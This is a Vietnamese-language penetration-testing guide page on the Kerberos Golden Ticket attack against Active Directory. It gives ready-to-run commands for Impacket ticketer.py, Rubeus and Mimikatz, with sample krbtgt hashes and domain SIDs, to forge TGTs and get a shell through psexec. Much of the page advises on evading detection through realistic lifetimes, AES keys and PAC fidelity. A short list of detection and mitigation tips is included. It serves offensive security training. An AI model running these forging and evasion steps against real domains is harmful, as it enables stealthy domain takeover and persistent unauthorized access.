# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Cuộc tấn công **Golden Ticket** tạo **Ticket Granting Ticket (TGT) hợp lệ để mạo danh bất kỳ người dùng nào** bằng cách sử dụng **NTLM hash của tài khoản Active Directory (AD) krbtgt**. Kỹ thuật này đặc biệt hữu ích vì **cho phép truy cập mọi dịch vụ hoặc máy** trong domain dưới danh nghĩa người dùng bị mạo danh. Cần nhớ rằng **thông tin xác thực của tài khoản krbtgt không bao giờ được tự động cập nhật**.<sup>[[1]](#references)</sup>

Có thể dùng nhiều phương pháp để **lấy NTLM hash** của tài khoản krbtgt. Hash này có thể được trích xuất từ **quy trình Local Security Authority Subsystem Service (LSASS)** hoặc tệp **NT Directory Services (NTDS.dit)** trên bất kỳ Domain Controller (DC) nào trong domain. Ngoài ra, **thực hiện tấn công DCsync** cũng là một cách lấy NTLM hash này. Có thể dùng các công cụ như **module lsadump::dcsync** trong Mimikatz hoặc **script secretsdump.py** của Impacket. Cần nhấn mạnh rằng để thực hiện các thao tác này, **thường cần có đặc quyền domain admin hoặc mức truy cập tương đương**.<sup>[[2]](#references)</sup>

Dù NTLM hash là một phương thức khả thi cho mục đích này, vì lý do bảo mật trong quá trình vận hành, **rất khuyến nghị** **giả mạo ticket bằng các khóa Kerberos Advanced Encryption Standard (AES) (AES128 và AES256)**. Điều này càng quan trọng trong các domain hiện đại vì **RC4 đang dần bị loại bỏ** và việc sử dụng nó dễ bị nhận diện hơn nhiều trong dữ liệu telemetry của Kerberos.<sup>[[5]](#references)</sup>

```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```

### Ghi chú hiện đại về tạo ticket giả

Khi có thể, **hãy truy vấn LDAP và SYSVOL trước**, rồi tạo ticket giả bằng chính sách miền và các giá trị PAC của người dùng thực tế thay vì tự nghĩ ra:<sup>[[4]](#references)</sup>

```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```

- `/ldap` yêu cầu DC cung cấp dữ liệu về người dùng, nhóm, NetBIOS và chính sách để tạo PAC thực tế hơn.
- `/printcmd` in ra dòng lệnh offline chứa các trường PAC đã truy xuất, hữu ích nếu sau này bạn muốn giả mạo cùng vé mà không cần truy cập LDAP lần nữa.
- `/extendedupndns` thêm các phần tử PAC `UpnDns` mới hơn, chứa `samAccountName` và SID của tài khoản.
- `/oldpac` loại bỏ các bộ đệm PAC `Requestor` và `Attributes` mới hơn; tùy chọn này chủ yếu hữu ích cho việc kiểm tra khả năng tương thích với các môi trường cũ hơn, không dành cho tradecraft mặc định.

Trên Linux, các phiên bản Impacket gần đây cũng hỗ trợ thêm các cấu trúc PAC mới hơn và thiết lập thời hạn hiệu lực thực tế:

```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -user-id 500 -groups 512,513,518,519 -duration 10 \
  -extra-pac administrator
```

- `-duration` tính bằng **giờ**. Mặc định là **10 năm**, rất dễ gây chú ý.
- `-extra-pac` bổ sung thông tin PAC `UPN_DNS` mới hơn.
- `-old-pac` buộc sử dụng bố cục PAC cũ.
- `-extra-sid` hữu ích khi PAC cần thêm SID (ví dụ: trong các tình huống leo thang từ child lên parent, được đề cập trong [SID-History Injection](sid-history-injection.md)).

**Sau khi** đã inject **golden Ticket**, bạn có thể truy cập các tệp được chia sẻ **(C$)**, thực thi dịch vụ và WMI, nên bạn có thể dùng **psexec** hoặc **wmiexec** để lấy shell (có vẻ như bạn không thể lấy shell qua winrm).

### Né tránh các phương pháp phát hiện phổ biến

Các cách phổ biến nhất để phát hiện golden ticket là **kiểm tra lưu lượng Kerberos** trên mạng. Theo mặc định, Mimikatz **ký TGT có thời hạn 10 năm**, điều này sẽ nổi bật như một bất thường trong các yêu cầu TGS tiếp theo được gửi bằng TGT đó.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Dùng các tham số `/startoffset`, `/endin` và `/renewmax` để kiểm soát độ lệch thời gian bắt đầu, thời hạn và số lần gia hạn tối đa (tất cả tính bằng phút).

```
Get-DomainPolicy | select -expand KerberosPolicy
```

Đáng tiếc là thời hạn tồn tại của TGT không được ghi lại trong các sự kiện 4769, vì vậy bạn sẽ không tìm thấy thông tin này trong nhật ký sự kiện Windows. Tuy nhiên, bạn có thể đối chiếu bằng cách **thấy các sự kiện 4769 mà trước đó không có sự kiện 4768**. **Không thể yêu cầu TGS nếu không có TGT**, và nếu không có bản ghi nào cho thấy TGT đã được cấp, ta có thể suy luận rằng nó đã được giả mạo ngoại tuyến.

Trong **các bản dựng Windows mới hơn**, Event ID **4768** và **4769** cũng cung cấp dữ liệu đo từ xa về **loại mã hóa** tốt hơn nhiều. TGT/TGS giả mạo sử dụng **RC4 (`0x17`)** trong một domain mà `krbtgt`, máy khách và dịch vụ đã có khóa AES sẽ dễ bị phát hiện hơn nhiều so với vài năm trước. Đây là thêm một lý do để ưu tiên **Golden Tickets được hỗ trợ bởi AES** và khớp chính sách Kerberos thông thường của domain sát nhất có thể.

Một vấn đề OPSEC khác là **độ trung thực của PAC**. Những ticket có thành viên nhóm bất khả thi, thiếu các bộ đệm PAC mới hơn hoặc siêu dữ liệu tài khoản không khớp với LDAP sẽ dễ bị phát hiện hơn khi đội phòng thủ xác thực nội dung PAC với dữ liệu AD. Nếu bạn cần một TGT trông như thực sự được DC cấp, hãy xem:

{{#ref}}
diamond-ticket.md
{{#endref}}

Ngoài ra còn có **các giới hạn từ môi trường** đối với khả năng duy trì truy cập. Tài khoản `krbtgt` lưu **2 mật khẩu trong lịch sử**, vì vậy TGT giả mạo vẫn có thể hợp lệ sau lần đặt lại `krbtgt` **đầu tiên** nếu nó được ký bằng khóa trước đó. Đây là lý do đội phòng thủ vô hiệu hóa Golden Tickets bằng cách **đặt lại `krbtgt` hai lần** và chờ ít nhất bằng thời hạn tồn tại tối đa của ticket trong domain giữa hai lần đặt lại.<sup>[[3]](#references)</sup>

Để **vượt qua bước kiểm tra phát hiện này**, hãy xem xét diamond tickets.

### Giảm thiểu

- 4624: Đăng nhập tài khoản
- 4672: Đăng nhập quản trị viên
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Một số thủ thuật nhỏ khác mà đội phòng thủ có thể áp dụng là **cảnh báo khi có sự kiện 4769 cho người dùng nhạy cảm**, chẳng hạn như tài khoản quản trị viên domain mặc định, và cảnh báo khi **`krbtgt` sử dụng RC4** trong các domain thường cấp ticket AES.<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): Cách tấn công Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [Khôi phục rừng AD - Đặt lại mật khẩu krbtgt | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – Cách quản lý việc Kerberos KDC sử dụng RC4 để cấp ticket cho tài khoản dịch vụ (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)
{{#include ../../banners/hacktricks-training.md}}
